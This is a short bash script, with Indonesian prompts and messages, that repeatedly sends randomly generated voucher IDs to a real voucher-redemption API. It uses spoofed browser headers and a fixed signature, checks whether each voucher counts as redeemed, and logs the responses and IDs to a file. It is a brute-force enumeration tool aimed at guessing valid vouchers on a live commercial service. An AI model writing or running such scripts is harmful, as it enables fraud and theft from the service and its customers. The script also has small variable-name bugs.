#!/bin/bash
tempek(){
	randem=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 32 | head -n 1)
	curl=$(curl -s --compressed --cookie ${random}_tmp "https://api.ultravoucher.co.id/urlredeem/api/voucher/info/" -L \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0' \
	-H 'Accept: application/json, text/plain, */*' \
	-H 'Accept-Language: en-US,en;q=0.5' \
	-H 'Referer: https://e.uvcr.me/$randem/1555401523' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	-H 'Origin: https://e.uvcr.me' \
	-H 'Connection: keep-alive' \
	--data "signature=5ss34g7O33UfOiS3u9Q%2F3z0bOnYRMjqkVM6SOksxTRo%3D&millisecond=1566055408445&pass=3uikot2nxth8d5kt0heclem&key=a920pl9vn6&id_stock=$randem&voucher_key=1555401523&voucher_sign=zgdb3h25ee4di16u3kasb7y6zcev7zvd35v00qv3xi8119wgu6iyhl710b30&stock_validate=ywy6vhfdqp29ius3")
	result=$(echo $curl | grep -Po '(?<="is_redeemed":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
	if [[ $result =~ "Ya" ]]; then
		printf "TERPAKAI BRO\n"
		echo "$result"
	else
		printf "$curl\n"
		echo "$curl|$randem" >> asu.txt
	fi
}
read -p "Berapa Kali ? : " limit;
for (( i = 0; i < $limit; i++ )); do
	tempek
done
